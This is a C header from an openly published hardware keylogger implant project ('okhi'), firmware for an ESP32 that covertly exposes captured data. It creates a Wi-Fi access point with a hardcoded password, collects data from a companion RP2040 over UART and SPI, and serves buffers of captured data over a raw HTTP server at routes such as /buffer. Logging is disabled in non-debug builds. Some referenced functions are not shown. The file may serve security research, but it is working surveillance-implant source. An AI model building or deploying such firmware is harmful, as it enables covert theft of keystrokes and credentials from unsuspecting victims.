/*
MIT License - okhi - Open Keylogger Hardware Implant
---------------------------------------------------------------------------
Copyright (c) [2024] by David Reguera Garcia aka Dreg
https://github.com/therealdreg/okhi
https://www.rootkit.es
X @therealdreg
dreg@rootkit.es
---------------------------------------------------------------------------
Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
---------------------------------------------------------------------------
WARNING: BULLSHIT CODE X-)
---------------------------------------------------------------------------
*/

#ifndef __COM_ESP_H__
#define __COM_ESP_H__

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <unistd.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/timers.h"

#include "esp_event.h"
#include "esp_log.h"
#include "esp_mac.h"
#include "esp_netif.h"
#include "esp_spiffs.h"
#include "esp_wifi.h"

#include "nvs_flash.h"

#include "lwip/err.h"
#include "lwip/sys.h"

#include "driver/gpio.h"
#include "driver/spi_slave.h"
#include "driver/uart.h"

// #define ENABLE_DBUG 1

#define HTTP_PORT 80
#define LISTEN_BACKLOG 4
#define RECV_TIMEOUT_MS 2000
#define MAX_REQ 2048

#define ESP_WIFI_PASS "1234567890"
#define ESP_WIFI_CHANNEL CONFIG_ESP_WIFI_CHANNEL
#define MAX_STA_CONN 6

#define GTK_REKEY_INTERVAL CONFIG_ESP_GTK_REKEY_INTERVAL

#define GPIO_HANDSHAKE 3
#define GPIO_MOSI 7
#define GPIO_MISO 2
#define GPIO_SCLK 6
#define GPIO_CS 10

#define RCV_HOST SPI2_HOST

#define EBOOT_MASTERDATAREADY_GPIO 9
#define ELOG_SLAVEREADY_GPIO 8

#define RING_BUFF_MAX_ENTRIES 200
#define LINE_SIZE 64 // must be 32 or 64
#define DEBUG_LOG_SIZE 512 * 2

#define HTTP_CHUNK_SIZE 2048

#define RP_UART_BAUD 74880
#define UART_PORT UART_NUM_0
#define UART_TX_PIN GPIO_NUM_20
#define UART_RX_PIN GPIO_NUM_19
#define UART_RXBUF_SZ 256

#define LED_GPIO 0

static char HwVer[256];
static bool hwver_init;
static unsigned int write_index;
static char ringbuff[RING_BUFF_MAX_ENTRIES][LINE_SIZE];
static unsigned char buffer_esp[DEBUG_LOG_SIZE];
static unsigned char buffer_rp2040[DEBUG_LOG_SIZE];
static const char *TAG = "okhi";
static const char *HTTP_TAG = "http";
static const char *SPI_TAG = "spi";
static const char *UART_TAG = "uart";
static const char *SPIFFS_TAG = "spiffs";
static const char *WIFI_TAG = "wifi";

static void blink_led_n(int n)
{
    gpio_config_t io = {.pin_bit_mask = 1ULL << LED_GPIO,
                        .mode = GPIO_MODE_OUTPUT,
                        .pull_up_en = GPIO_PULLUP_DISABLE,
                        .pull_down_en = GPIO_PULLDOWN_DISABLE,
                        .intr_type = GPIO_INTR_DISABLE};

    gpio_config(&io);
    vTaskDelay(pdMS_TO_TICKS(500));
    for (int i = 0; i < n; ++i)
    {
        gpio_set_level(LED_GPIO, 1);
        vTaskDelay(pdMS_TO_TICKS(500));
        gpio_set_level(LED_GPIO, 0);
        vTaskDelay(pdMS_TO_TICKS(500));
    }
}

static void spiffs_init(void)
{
    esp_vfs_spiffs_conf_t conf = {
        .base_path = "/spiffs", .partition_label = "storage", .max_files = 8, .format_if_mount_failed = true};

    esp_err_t ret = esp_vfs_spiffs_register(&conf);
    if (ret != ESP_OK)
    {
        ESP_LOGE(SPIFFS_TAG, "error mounting SPIFFS (%s)", esp_err_to_name(ret));
    }
    else
    {
        size_t total = 0, used = 0;
        if (esp_spiffs_info(conf.partition_label, &total, &used) == ESP_OK)
        {
            ESP_LOGI(SPIFFS_TAG, "SPIFFS total=%u used=%u", (unsigned)total, (unsigned)used);
        }
    }
}

static void my_post_setup_cb(spi_slave_transaction_t *trans)
{
    gpio_set_level(ELOG_SLAVEREADY_GPIO, 1);
}

static void my_post_trans_cb(spi_slave_transaction_t *trans)
{
    gpio_set_level(ELOG_SLAVEREADY_GPIO, 0);
}

static void wifi_event_handler(void *arg, esp_event_base_t event_base, int32_t event_id, void *event_data)
{
    if (event_id == WIFI_EVENT_AP_STACONNECTED)
    {
        wifi_event_ap_staconnected_t *event = (wifi_event_ap_staconnected_t *)event_data;
        ESP_LOGI(WIFI_TAG, "station " MACSTR " join, AID=%d", MAC2STR(event->mac), event->aid);
    }
    else if (event_id == WIFI_EVENT_AP_STADISCONNECTED)
    {
        wifi_event_ap_stadisconnected_t *event = (wifi_event_ap_stadisconnected_t *)event_data;
        ESP_LOGI(WIFI_TAG, "station " MACSTR " leave, AID=%d, reason=%d", MAC2STR(event->mac), event->aid,
                 event->reason);
    }
}

static void wifi_init_softap(void)
{
    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());
    esp_netif_create_default_wifi_ap();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));

    ESP_ERROR_CHECK(esp_event_handler_instance_register(WIFI_EVENT, ESP_EVENT_ANY_ID, &wifi_event_handler, NULL, NULL));

    wifi_config_t wifi_config = {
        .ap =
            {
                .channel = ESP_WIFI_CHANNEL,
                .password = ESP_WIFI_PASS,
                .max_connection = MAX_STA_CONN,
                .authmode = WIFI_AUTH_WPA2_WPA3_PSK,
                .sae_pwe_h2e = WPA3_SAE_PWE_BOTH,
                .pmf_cfg =
                    {
                        .required = true,
                    },
                .gtk_rekey_interval = GTK_REKEY_INTERVAL,
            },
    };

    if (strlen(ESP_WIFI_PASS) == 0)
    {
        wifi_config.ap.authmode = WIFI_AUTH_OPEN;
    }

    uint8_t mac[6] = {0};
    ESP_ERROR_CHECK(esp_read_mac(mac, ESP_MAC_WIFI_SOFTAP));

    char ssid[32] = {0};
    int n = snprintf(ssid, sizeof(ssid), "%s_%02X%02X%02X%02X%02X%02X", WIFI_PREFIX, mac[0], mac[1], mac[2], mac[3],
                     mac[4], mac[5]);

    memcpy(wifi_config.ap.ssid, ssid, n);
    wifi_config.ap.ssid_len = n;

    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &wifi_config));
    ESP_ERROR_CHECK(esp_wifi_start());

    ESP_LOGI(WIFI_TAG, "wifi_init_softap SSID:%s password:%s channel:%d", ssid, ESP_WIFI_PASS, ESP_WIFI_CHANNEL);
}

static void uart_init(void)
{
    uart_config_t cfg = {
        .baud_rate = RP_UART_BAUD,
        .data_bits = UART_DATA_8_BITS,
        .parity = UART_PARITY_DISABLE,
        .stop_bits = UART_STOP_BITS_1,
        .flow_ctrl = UART_HW_FLOWCTRL_DISABLE,
        .source_clk = UART_SCLK_DEFAULT,
    };

    ESP_ERROR_CHECK(uart_param_config(UART_PORT, &cfg));
    ESP_ERROR_CHECK(uart_set_pin(UART_PORT, UART_TX_PIN, UART_RX_PIN, UART_PIN_NO_CHANGE, UART_PIN_NO_CHANGE));
    ESP_ERROR_CHECK(uart_driver_install(UART_PORT, UART_RXBUF_SZ, 0, 0, NULL, 0));
}

static void uart_rx_task(void *arg)
{
    uint8_t chunk[64];
    while (1)
    {
        memset(chunk, 0, sizeof(chunk));
        int len = uart_read_bytes(UART_PORT, chunk, sizeof(chunk) - 1, pdMS_TO_TICKS(20));
        if (len > 1)
        {
            buffer_rp2040[0] = 0;

            ESP_LOGD(UART_TAG, "Received %d bytes: ", len);
            for (int i = 0; i < len; ++i)
            {
                ESP_LOGD(UART_TAG, "Byte %d: 0x%02X", i, chunk[i]);
            }
            ESP_LOGD(UART_TAG, "Buffer (RP2040): %s", chunk);

            int i = 1;
            for (i = 1; (i + 1) < len; ++i)
            {
                buffer_rp2040[i] = (chunk[i] >= 0x20 && chunk[i] <= 0x7E) ? chunk[i] : '?';
            }
            if (chunk[0] != 0)
            {
                buffer_rp2040[0] = (chunk[0] >= 0x20 && chunk[0] <= 0x7E) ? chunk[0] : '?';
            }
            else
            {
                buffer_rp2040[0] = 0;
            }
            buffer_rp2040[i] = '\0';
        }
        vTaskDelay(pdMS_TO_TICKS(10));
    }
}

static int send_all(int fd, const void *buf, size_t len)
{
    const uint8_t *p = (const uint8_t *)buf;

    size_t left = len;
    while (left)
    {
        int n = send(fd, p, left > INT_MAX ? INT_MAX : (int)left, 0);
        if (n < 0)
        {
            if (errno == EINTR)
            {
                continue;
            }
            return -1;
        }
        left -= (size_t)n;
        p += n;
    }
    return 0;
}

static void http_send_200_html(int client_fd, const char *body)
{
    char header[256];
    unsigned body_len = (unsigned)strlen(body);

    int n = snprintf(header, sizeof(header),
                     "HTTP/1.1 200 OK\r\n"
                     "Content-Type: text/html; charset=UTF-8\r\n"
                     "Content-Length: %u\r\n"
                     "Connection: close\r\n"
                     "\r\n",
                     body_len);
    if (n < 0 || n >= (int)sizeof(header))
    {
        return;
    }
    if (send_all(client_fd, header, (size_t)n) < 0)
    {
        return;
    }

    send_all(client_fd, body, body_len);
}

static void http_send_200_text(int client_fd, const char *body)
{
    char header[256];
    unsigned body_len = (unsigned)strlen(body);

    int n = snprintf(header, sizeof(header),
                     "HTTP/1.1 200 OK\r\n"
                     "Content-Type: text/plain; charset=UTF-8\r\n"
                     "Content-Length: %u\r\n"
                     "Connection: close\r\n"
                     "\r\n",
                     body_len);
    if (n < 0 || n >= (int)sizeof(header))
    {
        return;
    }
    if (send_all(client_fd, header, (size_t)n) < 0)
    {
        return;
    }

    send_all(client_fd, body, body_len);
}

static void http_send_404(int client_fd)
{
    const char *body = "<h1>404 Not Found</h1>";
    char header[256];
    unsigned blen = (unsigned)strlen(body);

    int n = snprintf(header, sizeof(header),
                     "HTTP/1.1 404 Not Found\r\n"
                     "Content-Type: text/html; charset=UTF-8\r\n"
                     "Content-Length: %u\r\n"
                     "Connection: close\r\n"
                     "\r\n",
                     blen);
    if (n < 0 || n >= (int)sizeof(header))
    {
        return;
    }
    if (send_all(client_fd, header, (size_t)n) < 0)
    {
        return;
    }

    send_all(client_fd, body, blen);
}

static void http_send_204(int client_fd)
{
    const char *resp = "HTTP/1.1 204 No Content\r\n"
                       "Connection: close\r\n"
                       "\r\n";
    send_all(client_fd, resp, strlen(resp));
}

static int http_read_request(int client_fd, char *buf, size_t buflen)
{
    size_t used = 0;

    while (used + 1 < buflen)
    {
        int n = recv(client_fd, buf + used, (int)(buflen - 1 - used), 0);
        if (n > 0)
        {
            used += n;
            buf[used] = '\0';
            if (strstr(buf, "\r\n\r\n"))
            {
                return (int)used;
            }
            continue;
        }
        else if (n == 0)
        {
            break;
        }
        else
        {
            if (errno == EINTR)
            {
                continue;
            }
            if (errno == EWOULDBLOCK || errno == EAGAIN)
            {
                break;
            }
            return -1;
        }
    }

    return (int)used;
}

static int http_send_index_gz(int client_fd)
{
    const char *file = "/spiffs/index.html.gz";
    struct stat st;

    if (stat(file, &st) != 0)
    {
        const char *body = "index.html.gz not found\n";
        char hdr[192];

        int n = snprintf(hdr, sizeof(hdr),
                         "HTTP/1.1 404 Not Found\r\n"
                         "Content-Type: text/plain; charset=UTF-8\r\n"
                         "Content-Length: %u\r\n"
                         "Connection: close\r\n"
                         "\r\n",
                         (unsigned)strlen(body));
        if (n > 0 && n < (int)sizeof(hdr))
        {
            send_all(client_fd, hdr, (size_t)n);
        }

        send_all(client_fd, body, strlen(body));

        return -1;
    }

    int fd = open(file, O_RDONLY);
    if (fd < 0)
    {
        const char *body = "Could not open index.html.gz\n";
        char hdr[192];
        int n = snprintf(hdr, sizeof(hdr),
                         "HTTP/1.1 500 Internal Server Error\r\n"
                         "Content-Type: text/plain; charset=UTF-8\r\n"
                         "Content-Length: %u\r\n"
                         "Connection: close\r\n"
                         "\r\n",
                         (unsigned)strlen(body));

        if (n > 0 && n < (int)sizeof(hdr))
        {
            send_all(client_fd, hdr, (size_t)n);
        }

        send_all(client_fd, body, strlen(body));

        return -1;
    }

    char hdr[192];
    int n = snprintf(hdr, sizeof(hdr),
                     "HTTP/1.1 200 OK\r\n"
                     "Content-Type: text/html; charset=UTF-8\r\n"
                     "Content-Encoding: gzip\r\n"
                     "Cache-Control: no-cache\r\n"
                     "Content-Length: %u\r\n"
                     "Connection: close\r\n"
                     "\r\n",
                     (unsigned)st.st_size);
    if (n <= 0 || n >= (int)sizeof(hdr) || send_all(client_fd, hdr, (size_t)n) < 0)
    {
        close(fd);
        return -1;
    }

    uint8_t chunk[1024];
    while (1)
    {
        int r = read(fd, chunk, sizeof(chunk));
        if (r < 0)
        {
            close(fd);
            return -1;
        }
        if (r == 0)
        {
            break;
        }
        if (send_all(client_fd, chunk, (size_t)r) < 0)
        {
            close(fd);
            return -1;
        }
    }
    close(fd);

    return 0;
}

static void http_send_status_text(int client_fd, const char *status, const char *body)
{
    const char *b = body ? body : "";
    unsigned blen = (unsigned)strlen(b);
    char hdr[256];
    int n = snprintf(hdr, sizeof(hdr),
                     "HTTP/1.1 %s\r\n"
                     "Content-Type: text/plain; charset=UTF-8\r\n"
                     "Content-Length: %u\r\n"
                     "Connection: close\r\n"
                     "\r\n",
                     status, blen);

    if (n > 0 && n < (int)sizeof(hdr))
    {
        if (send_all(client_fd, hdr, (size_t)n) == 0 && blen)
        {
            send_all(client_fd, b, blen);
        }
    }
}

static void route_esp(int client_fd)
{
    if (buffer_esp[0] != '\0')
    {
        http_send_status_text(client_fd, "200 OK", (char *)buffer_esp);
    }
    else
    {
        http_send_status_text(client_fd, "204 No Content", "NO DATA");
    }
}

static void route_ver(int client_fd)
{
    http_send_status_text(client_fd, "200 OK", (const char *)FIRMV_STR);
}

static void route_rp(int client_fd)
{
    if (buffer_rp2040[0] != '\0')
    {
        http_send_status_text(client_fd, "200 OK", (char *)buffer_rp2040);
    }
    else
    {
        http_send_status_text(client_fd, "204 No Content", "NO DATA");
    }
}

static void route_hwver(int client_fd)
{
    if (!hwver_init)
    {
        char *p = strstr((char *)buffer_rp2040, "HWv");
        if (p)
        {
            hwver_init = true;
            strncpy(HwVer, p + 2, sizeof(HwVer) - 1);
            HwVer[sizeof(HwVer) - 1] = '\0';
            char *sp = strchr(HwVer, ' ');
            if (sp)
            {
                *sp = '\0';
            }
        }
    }
    if (hwver_init)
    {
        http_send_status_text(client_fd, "200 OK", HwVer);
    }
    else
    {
        http_send_status_text(client_fd, "204 No Content", NULL);
    }
}

static void handle_http_client(int client_fd)
{
    struct timeval tv = {.tv_sec = RECV_TIMEOUT_MS / 1000, .tv_usec = (RECV_TIMEOUT_MS % 1000) * 1000};
    setsockopt(client_fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    char req[MAX_REQ];
    int n = http_read_request(client_fd, req, sizeof(req));
    if (n <= 0)
    {
        shutdown(client_fd, SHUT_RDWR);
        close(client_fd);
        return;
    }

    char method[8] = {0}, path[128] = {0};
    sscanf(req, "%7s %127s", method, path);

    ESP_LOGI(HTTP_TAG, "Req: %s %s", method, path[0] ? path : "/");

    if (strcmp(method, "GET") == 0)
    {
        if (strcmp(path, "/") == 0)
        {
            http_send_index_gz(client_fd);
        }
        else if (strcmp(path, "/esp") == 0)
        {
            route_esp(client_fd);
        }
        else if (strcmp(path, "/rp") == 0)
        {
            route_rp(client_fd);
        }
        else if (strcmp(path, "/ver") == 0)
        {
            route_ver(client_fd);
        }
        else if (strcmp(path, "/hwver") == 0)
        {
            route_hwver(client_fd);
        }
        else if (strcmp(path, "/buffer") == 0)
        {
            route_buffer(client_fd);
        }
        else if (strcmp(path, "/hello") == 0)
        {
            http_send_200_text(client_fd, "Hi Dreg! From ESP32-C2 raw HTTP.\n");
        }
        else if (strcmp(path, "/status") == 0)
        {
            char body[128];
            snprintf(body, sizeof(body), "OK \n");
            http_send_200_text(client_fd, body);
        }
        else if (strcmp(path, "/favicon.ico") == 0)
        {
            http_send_204(client_fd);
        }
        else
        {
            http_send_404(client_fd);
        }
    }
    else
    {
        const char *resp = "HTTP/1.1 405 Method Not Allowed\r\n"
                           "Connection: close\r\n"
                           "\r\n";
        send_all(client_fd, resp, strlen(resp));
    }
    shutdown(client_fd, SHUT_WR);
    char drain[64];
    struct timeval rtv = {.tv_sec = 1, .tv_usec = 0};
    setsockopt(client_fd, SOL_SOCKET, SO_RCVTIMEO, &rtv, sizeof(rtv));
    while (recv(client_fd, drain, sizeof(drain), 0) > 0)
    {
    }
    close(client_fd);
}

static void http_server_task(void *arg)
{
    int listen_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    if (listen_fd < 0)
    {
        ESP_LOGE(HTTP_TAG, "socket() failed: %d", errno);
        vTaskDelete(NULL);
        return;
    }

    int yes = 1;
    setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes));

    struct sockaddr_in addr = {
        .sin_family = AF_INET, .sin_port = htons(HTTP_PORT), .sin_addr.s_addr = htonl(INADDR_ANY)};

    if (bind(listen_fd, (struct sockaddr *)&addr, sizeof(addr)) != 0)
    {
        ESP_LOGE(HTTP_TAG, "bind() failed: %d", errno);
        close(listen_fd);
        vTaskDelete(NULL);
        return;
    }

    if (listen(listen_fd, LISTEN_BACKLOG) != 0)
    {
        ESP_LOGE(HTTP_TAG, "listen() failed: %d", errno);
        close(listen_fd);
        vTaskDelete(NULL);
        return;
    }

    ESP_LOGI(HTTP_TAG, "HTTP server listening on :%d", HTTP_PORT);

    while (1)
    {
        struct sockaddr_in6 source_addr;
        socklen_t addr_len = sizeof(source_addr);
        int client_fd = accept(listen_fd, (struct sockaddr *)&source_addr, &addr_len);
        if (client_fd < 0)
        {
            if (errno == EINTR)
            {
                continue;
            }
            ESP_LOGW(HTTP_TAG, "accept() error: %d", errno);
            continue;
        }

        char host[64];
        if (source_addr.sin6_family == AF_INET)
        {
            inet_ntop(AF_INET, &(((struct sockaddr_in *)&source_addr)->sin_addr), host, sizeof(host));
        }
        else
        {
            inet_ntop(AF_INET6, &source_addr.sin6_addr, host, sizeof(host));
        }
        ESP_LOGI(HTTP_TAG, "Client connected from %s", host);

        handle_http_client(client_fd);
    }

    close(listen_fd);
    vTaskDelete(NULL);
}

void app_main(void)
{
    blink_led_n(3);

#ifndef ENABLE_DBUG
    // esp_log_level_set("*", ESP_LOG_NONE);
    // esp_log_level_set("wifi", ESP_LOG_WARN);
    // esp_log_level_set("*", ESP_LOG_ERROR);
    esp_log_level_set("*", ESP_LOG_NONE);
#endif

    spiffs_init();

    hwver_init = false;

    memset(HwVer, 0, sizeof(HwVer));
    strcpy((char *)buffer_rp2040, "RP ALL OK");
    strcpy((char *)buffer_esp, "ESP ALL OK");

    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND)
    {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    ESP_LOGI(WIFI_TAG, "ESP_WIFI_MODE_AP");
    wifi_init_softap();

    uart_init();

    ESP_LOGI(TAG, "okhi main done");

    xTaskCreate(http_server_task, "http_server_task", 4096 + 1024, NULL, tskIDLE_PRIORITY + 4, NULL);
    xTaskCreate(uart_rx_task, "uart_rx_task", 2048, NULL, tskIDLE_PRIORITY + 1, NULL);
    xTaskCreate(spi_task, "spi_task", 4096, NULL, configMAX_PRIORITIES - 1, NULL);
}

#endif // __COM_ESP_H__
